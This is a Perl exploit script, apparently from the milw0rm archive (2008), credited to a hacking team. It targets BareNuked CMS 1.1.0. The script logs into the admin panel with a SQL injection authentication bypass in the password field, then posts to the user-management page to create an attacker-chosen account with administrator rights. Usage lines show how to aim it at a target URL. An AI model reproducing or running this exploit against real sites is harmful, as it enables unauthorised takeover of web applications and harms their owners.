#!/usr/bin/perl
#============================================
# BareNuked CMS Arbitrary Add Admin Exploit
#============================================
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 30 June 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : BareNuked CMS
#VERSION     : 1.1.0
#DOWNLOAD    : http://downloads.sourceforge.net/barenuked/barenuked-1.1.0.zip
######################################################
#
#Note: magic_quotes_gpc = off
#
#This Exploit will Add user to Administrator's Privilege.
#
##################################################################
# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
##################################################################
#
# milw0rm.com [2008-06-30]


use LWP;
use HTTP::Request;
use HTTP::Cookies;

if ($#ARGV + 1 != 4)
{
   print "\n==============================================\n";
   print "  BareNuked CMS Arbitrary Add Admin Exploit   \n";
   print "                                              \n";
   print "        Discovered By CWH Underground         \n";
   print "==============================================\n";
   print "                                              \n";
   print "  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O	\n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";
   print "                                              \n"; 
   print "Usage: ./xpl-barenuked.pl <BareNuked-CMS URL> <user> <pass> <email>\n";
   print "Ex. ./xpl-barenuked.pl http://www.target.com/barenuked/ cwh password cwh\@cwh.com\n";
   exit();
}

$cmsurl = $ARGV[0];
$user = $ARGV[1];
$pass = $ARGV[2];
$mail = $ARGV[3];


$loginurl = $cmsurl."admin/index.php";
$adduserurl = $cmsurl."admin/users.php";
$post_content = "name=".$user."&pass=".$pass."&email=".$mail."&rights=admin&mode=create&Submit=New";

print "\n..::Login Page URL::..\n";
print "[+] $loginurl\n";
print "\n..::Add User Page URL::..\n";
print "[+] $adduserurl\n\n";

$ua = LWP::UserAgent->new;
$ua->cookie_jar(HTTP::Cookies->new);

$request = HTTP::Request->new (POST => $loginurl);
$request->header (Accept-Charset => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
$request->content_type ('application/x-www-form-urlencoded');
$request->content ('username=admin&password=\' or \'a\'=\'a&submit=Log+In');

$response = $ua->request($request);

$content = $response->content;

if ($content =~ /My Webpage Administration/)
{
   print "\n!!! Login Success !!!\n\n";
}
else
{
   print "\n!!! Login Failed !!!\n\n";
   exit();
}

$request = HTTP::Request->new (POST => $adduserurl);
$request->content_type ('application/x-www-form-urlencoded');
$request->content ($post_content);
$response = $ua->request($request);

$content = $response->content;

if ($content =~ /$user/)
{
   print "\n!!! Exploit Completed !!!\n";
}
else
{
   print "\n!!! Exploit Failed !!!\n";
}

# milw0rm.com [2008-06-30]
